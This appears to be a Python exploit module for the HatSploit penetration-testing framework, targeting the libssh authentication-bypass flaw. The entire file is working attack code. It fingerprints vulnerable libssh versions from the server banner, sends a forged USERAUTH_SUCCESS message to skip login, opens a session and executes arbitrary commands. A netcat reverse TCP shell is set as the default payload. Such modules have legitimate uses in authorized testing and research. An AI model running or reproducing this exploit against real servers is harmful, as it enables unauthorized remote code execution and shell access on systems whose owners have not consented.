"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import paramiko
from hatsploit.lib.handler import Handler
from hatsploit.lib.module import Module
from pex.proto.tcp import TCPClient


class HatSploitModule(Module, Handler, TCPClient):
    def __init__(self):
        super().__init__()

        self.buffer_size = 2048
        self.client = None

        self.details = {
            'Category': "exploit",
            'Name': "SSH LibSSH Code Execution",
            'Module': "exploit/linux/ssh/libssh_code_execution",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Peter Winter-Smith (peterwintersmith) - vulnerability researcher',
            ],
            'Description': "SSH LibSSH unauthorized access Remote Code Execution.",
            'Platform': "linux",
            'Rank': "medium",
        }

        self.payload = {
            'Value': "unix/generic/netcat_reverse_tcp",
            'Architectures': None,
            'Platforms': ['linux', 'unix'],
            'Action': "shell",
            'Types': None,
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 2222,
                'Type': "port",
                'Required': True,
            },
        }

    def exploit(self, remote_host, remote_port, command):
        client = self.open_tcp(remote_host, remote_port)
        client.connect()

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(client.sock)
        transport.start_client()

        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        conn = transport.open_session(timeout=5)
        conn.exec_command(command)

        output = conn.makefile("rb", 4096)
        output = output.read()

        return output.decode()

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        try:
            sock = self.open_tcp(remote_host, remote_port)
            banner = sock.recv(self.buffer_size)
            sock.close()

            banner = banner.split(b'\n')[0].decode().strip()
        except Exception:
            banner = None

        if banner:
            if any(version in banner for version in ['libssh-0.6', 'libssh_0.6']):
                return True
            if any(version in banner for version in ['libssh-0.7', 'libssh_0.7']):
                if int(banner.split('.')[-1]) < 6:
                    return True
            if any(version in banner for version in ['libssh-0.8', 'libssh_0.8']):
                if int(banner.split('.')[-1]) < 4:
                    return True

        return False

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.module_handle(
            module=self,
            sender=self.exploit,
            remote_host=remote_host,
            remote_port=remote_port,
        )
